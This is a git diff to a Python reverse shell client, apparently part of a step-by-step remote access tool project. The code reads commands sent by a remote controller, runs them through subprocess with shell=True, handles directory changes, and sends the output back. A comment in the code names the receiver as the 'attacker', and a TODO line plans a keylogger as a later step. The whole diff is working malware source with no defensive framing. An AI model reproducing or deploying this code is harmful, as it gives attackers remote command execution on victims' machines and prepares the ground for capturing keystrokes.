@@ -16,39 +16,27 @@ print("connected")
 
 def execute_shell():
     while True:
-        data = client.recv(1024)
-        data = data.decode()
+        data = client.recv(1024).decode()
+
         print(f"command received: {data}")
 
         if data == 'quit':
             break
-        #elif data == 'cd':
+        elif data[:2] == 'cd':
+            try:
+                os.chdir(data[3:])
 
+            except:#there wasn't anything after "cd"
+                pass
+                
+            finally:
+                client.send(os.getcwd().encode())
 
+        #TODO add elif('s) for keylogger (step 6)
+        else:
+            op = subprocess.Popen(data, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+            client.send(op.stdout.read() + op.stderr.read())
         
-        try:
-            print(data)
-            command, params = data.split(" ", 1)
-            print(command ,params)
-            if command == "cd":
-                os.chdir(params)
-                print("chdir to %s" % (params))
-                data = os.getcwd()
-                print("continueing")
-                continue
-        except:
-            print("failed to split")
-            pass
-        
-
-        op = subprocess.Popen(data, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-        output = op.stdout.read()
-        output_error = op.stderr.read()
-        #send response/output back to attacker
-        #print(f"sending: {output.decode() + output_error.decode()}")
-        print(f"sent output from command: {data}")
-        print(output + output_error)
-        client.send(output + output_error)
         
 
 execute_shell()
